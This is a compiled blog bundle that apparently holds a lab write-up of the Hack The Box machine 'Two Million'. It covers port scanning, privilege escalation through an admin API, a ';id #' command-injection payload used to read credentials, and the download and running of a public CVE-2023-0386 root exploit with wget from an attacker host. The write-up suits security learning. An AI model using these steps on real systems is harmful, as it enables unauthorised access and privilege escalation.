"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[1200],{345:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-1-44a5e88fc5d4b4bf08a2d53f807be20a.png"},555:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-3-e8a46b7e6da7df0a7bcbf4aee440ccdc.png"},612:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-4-8c05b368bb63181127adc02b441811e0.png"},4367:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-12-d90868d3521bf23af1a0582bf59b7657.png"},4388:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>h,contentTitle:()=>r,default:()=>l,frontMatter:()=>o,metadata:()=>i,toc:()=>d});var i=n(5333),s=n(4848),a=n(8453);const o={title:"Two Million",date:new Date("2025-08-02T00:00:00.000Z"),tags:["easy","linux"]},r=void 0,h={authorsImageUrls:[]},d=[{value:"Task 1",id:"task-1",level:3},{value:"Task 2",id:"task-2",level:3},{value:"Task 3",id:"task-3",level:3},{value:"Task 4",id:"task-4",level:3},{value:"Task 5",id:"task-5",level:3},{value:"Task 6",id:"task-6",level:3},{value:"Task 7",id:"task-7",level:3},{value:"Task 8",id:"task-8",level:3},{value:"Task 9",id:"task-9",level:3},{value:"Task 10",id:"task-10",level:3},{value:"Task 11",id:"task-11",level:3},{value:"Task 12",id:"task-12",level:3},{value:"Task 13",id:"task-13",level:3}];function c(e){const t={a:"a",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h3,{id:"task-1",children:"Task 1"}),"\n",(0,s.jsx)(t.p,{children:"How many TCP ports are open?"}),"\n",(0,s.jsxs)(t.p,{children:["Running ",(0,s.jsx)(t.code,{children:"nmap -sS <target_ip>"})," we see two ports open on the target system."]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(345).A+"",width:"801",height:"203"})}),"\n",(0,s.jsx)(t.h3,{id:"task-2",children:"Task 2"}),"\n",(0,s.jsx)(t.p,{children:"What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?"}),"\n",(0,s.jsxs)(t.p,{children:["Navigating to the target IP on the browser we see that the server is not found. After adding the target IP on the host file using the command ",(0,s.jsx)(t.code,{children:"sudo vim /etc/hosts"})," with the domain name being ",(0,s.jsx)(t.code,{children:"2million.htb"})," we can refresh the page and navigate to the /invite page. There, we see a sign-up/login form."]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(5202).A+"",width:"590",height:"318"})}),"\n",(0,s.jsxs)(t.p,{children:["Viewing the page source and searching for any Javascript file, we locate the following, having the name ",(0,s.jsx)(t.code,{children:"inviteapi.min.js"}),":"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(555).A+"",width:"922",height:"530"})}),"\n",(0,s.jsx)(t.h3,{id:"task-3",children:"Task 3"}),"\n",(0,s.jsx)(t.p,{children:"What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer."}),"\n",(0,s.jsxs)(t.p,{children:["Opening the previous file, we locate the function ",(0,s.jsx)(t.code,{children:"makeInviteCode"})," that is the Javascript function returning the first hint."]}),"\n",(0,s.jsx)(t.h3,{id:"task-4",children:"Task 4"}),"\n",(0,s.jsx)(t.p,{children:"The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?"}),"\n",(0,s.jsxs)(t.p,{children:["First, opening the console on the developer tools, we call the function by ",(0,s.jsx)(t.code,{children:"makeInviteCode"})," and observe the result:"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(612).A+"",width:"1001",height:"399"})}),"\n",(0,s.jsxs)(t.p,{children:["We see that the data is encoded with ROT13, so we can decode the value of the field ",(0,s.jsx)(t.code,{children:"data"}),' using any ROT13 decoder and we get the message "In order to generate the invite code, make a POST request to /api/v1/invite/generate". So, we can use ',(0,s.jsx)(t.code,{children:"fetch"})," in the browser console to query this endpoint by:"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{children:"fetch('/api/v1/invite/generate', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n})\n  .then(res => res.json())\n  .then(data => console.log(data));\n"})}),"\n",(0,s.jsx)(t.p,{children:"As a response, we see the code that is encoded using Base64."}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(6765).A+"",width:"542",height:"74"})}),"\n",(0,s.jsx)(t.h3,{id:"task-5",children:"Task 5"}),"\n",(0,s.jsx)(t.p,{children:'What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?'}),"\n",(0,s.jsx)(t.p,{children:'First, we decode the code from the previous task and use it to sign up and register for an account. We then login and look for the "Connection Pack". We find it under the "Access" page, we open the tools on the Network tab and clicking the button. On the Headers tab of the request we see the API endpoint where the GET function sends the request.'}),"\n",(0,s.jsx)(t.h3,{id:"task-6",children:"Task 6"}),"\n",(0,s.jsx)(t.p,{children:"How many API endpoints are there under /api/v1/admin?"}),"\n",(0,s.jsxs)(t.p,{children:["By navigating to the endpoint ",(0,s.jsx)(t.code,{children:"/api/v1"})," we can see a list of endpoints including admin."]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(6086).A+"",width:"569",height:"429"})}),"\n",(0,s.jsx)(t.h3,{id:"task-7",children:"Task 7"}),"\n",(0,s.jsx)(t.p,{children:"What API endpoint can change a user account to an admin account?"}),"\n",(0,s.jsxs)(t.p,{children:["Inspecting the result from the previous task we see that he desired endpoint is ",(0,s.jsx)(t.code,{children:"/api/v1/admin/settings/update"}),"."]}),"\n",(0,s.jsx)(t.h3,{id:"task-8",children:"Task 8"}),"\n",(0,s.jsx)(t.p,{children:"What API endpoint has a command injection vulnerability in it?"}),"\n",(0,s.jsx)(t.p,{children:"We can try to send a PUT request to the endpoint from the previous task using Repeater. We need to also adjust the content type to be Content-Type: application/json on the request. From the response we see that there is a missing parameter for the email field."}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(7624).A+"",width:"458",height:"315"})}),"\n",(0,s.jsx)(t.p,{children:"Adding the parameter email on the body of the request and repeating we see that there is also the is_admin parameter missing. We can try adding this as well with the value being true to see whether we are able to change the privileges for the registered user. Sending this request we get a status code of 200 meaning a successful request."}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(7569).A+"",width:"631",height:"418"})}),"\n",(0,s.jsxs)(t.p,{children:["We can also use the endpoint ",(0,s.jsx)(t.code,{children:"/api/v1/admin/auth"})," to check if the user is admin which returns a positive response. Since we are now an admin user, we can also try the last API endpoint with the method POST ",(0,s.jsx)(t.code,{children:"/api/v1/admin/vpn/generate"}),". For this request to succeed, we need also to add the Content-Type to be application/json as before as well as the username with its value as body parameter. To see if this is the endpoint that has the command injection vulnerability, we can try injecting ",(0,s.jsx)(t.code,{children:";id #"})," after the value of the username field on the body."]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(6957).A+"",width:"631",height:"404"})}),"\n",(0,s.jsx)(t.p,{children:"The request goes through giving us a 200 OK status code and returning back the user's identity information which means the command injection is successful."}),"\n",(0,s.jsx)(t.h3,{id:"task-9",children:"Task 9"}),"\n",(0,s.jsx)(t.p,{children:"What file is commonly used in PHP applications to store environment variable values?"}),"\n",(0,s.jsxs)(t.p,{children:["Further using the command injection, we can try listing the contents of the diretory by changing the ",(0,s.jsx)(t.code,{children:"id"})," command to ",(0,s.jsx)(t.code,{children:"ls"}),". On the response, we see a list of files and folders."]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(4452).A+"",width:"631",height:"443"})}),"\n",(0,s.jsxs)(t.p,{children:["From those, we can use ",(0,s.jsx)(t.code,{children:"cat index.php"})," command and see the contents of this file in the response."]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{alt:"alt text",src:n(4367).A+"",width:"583",height:"342"})}),"\n",(0,s.jsxs)(t.p,{children:["From the response it seems that those values are being read from a ",(0,s.jsx)(t.code,{children:".env"})," file. Seeing the contents of the file with the command ",(0,s.jsx)(t.code,{children:"cat .env"})," we get the environmental variables for the database as a response."]}),"\n",(0,s.jsx)(t.h3,{id:"task-10",children:"Task 10"}),"\n",(0,s.jsx)(t.p,{children:"Submit the flag located in the admin user's home directory."}),"\n",(0,s.jsxs)(t.p,{children:["Using the admin's credentials found previously, we can now directly ssh to the server to obtain the flag by ",(0,s.jsx)(t.code,{children:"ssh admin@2million.htb"})," and providing the admin's password. Then, finding the flag is just as easy as running ",(0,s.jsx)(t.code,{children:"cat user.txt"}),"."]}),"\n",(0,s.jsx)(t.h3,{id:"task-11",children:"Task 11"}),"\n",(0,s.jsx)(t.p,{children:"What is the email address of the sender of the email sent to admin?"}),"\n",(0,s.jsxs)(t.p,{children:["In linux, local emails are usually stored in ",(0,s.jsx)(t.code,{children:"/var/mail"}),' directory. Navigating there and opening the file with the name "admin" we find the sender.']}),"\n",(0,s.jsx)(t.h3,{id:"task-12",children:"Task 12"}),"\n",(0,s.jsx)(t.p,{children:"What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?"}),"\n",(0,s.jsxs)(t.p,{children:["Looking up for vulnerabilities of the Overlay file system in the ",(0,s.jsx)(t.a,{href:"https://www.cve.org/",children:"CVE database"}),", we find the CVE ID."]}),"\n",(0,s.jsx)(t.h3,{id:"task-13",children:"Task 13"}),"\n",(0,s.jsx)(t.p,{children:"Submit the flag located in root's home directory."}),"\n",(0,s.jsxs)(t.p,{children:["Looking up for a public exploit for this vulnerability we come up with a ",(0,s.jsx)(t.a,{href:"https://github.com/sxlmnwb/CVE-2023-0386",children:"github repository"}),". In order to use this exploit on the target machine where we gained the admin privilege, we have first to clone it on the host machine and then open a connection by spanning a python server on the directory where the repository file is. Before attempting transfer, we need to compress the entire foler into a single file using the command ",(0,s.jsx)(t.code,{children:"tar czf CVE-2023-0386.tar.gz CVE-2023-0386/"}),". Running ",(0,s.jsx)(t.code,{children:"python3 -m http.server 8080"})," opens a connection on port 8080 so we can now communicate from the target server to transfer the file using the command ",(0,s.jsx)(t.code,{children:"wget http://<host_ip>:8080/CVE-2023-038.tar.gz"}),". Then, after extracting the archive by ",(0,s.jsx)(t.code,{children:"tar xzf CVE-2023-0386.tar.gz"})," we can use the repository's README as guide to compile by running ",(0,s.jsx)(t.code,{children:"make"}),". On the same terminal we then run ",(0,s.jsx)(t.code,{children:"./fuse ./ovlcap/lower ./gc"})," and om a second terminal ",(0,s.jsx)(t.code,{children:"./exp"}),". We now have root access and we can navigate to root's directory, run ",(0,s.jsx)(t.code,{children:"cat root.txt"})," and get the flag."]})]})}function l(e={}){const{wrapper:t}={...(0,a.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(c,{...e})}):c(e)}},4452:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-11-3fecff40a6fe711a3c41c85287a398b4.png"},5202:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-2-a7054f9e4d1c11f2e9dfe305242ec1c7.png"},5333:e=>{e.exports=JSON.parse('{"permalink":"/Blog/blog/TwoMillion","editUrl":"https://github.com/danae-pan/Blog/blog/TwoMillion.md","source":"@site/blog/TwoMillion.md","title":"Two Million","description":"Task 1","date":"2025-08-02T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":5.705,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Two Million","date":"2025-08-02T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"nextItem":{"title":"Cicada","permalink":"/Blog/blog/Cicada"}}')},6086:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-6-58a64bab300755410abbd3eb3d884a70.png"},6765:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-5-f120ebc9d3aa6a80628771bdffd19f93.png"},6957:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-10-3bc452f38b49ac62d0e88a7850ab2fbd.png"},7569:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-9-4be6b81e194a2fe40e9d7190ac47a4b9.png"},7624:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/image-t-8-80438640b17331e3c9579032101f78c2.png"},8453:(e,t,n)=>{n.d(t,{R:()=>o,x:()=>r});var i=n(6540);const s={},a=i.createContext(s);function o(e){const t=i.useContext(a);return i.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function r(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),i.createElement(a.Provider,{value:t},e.children)}}}]);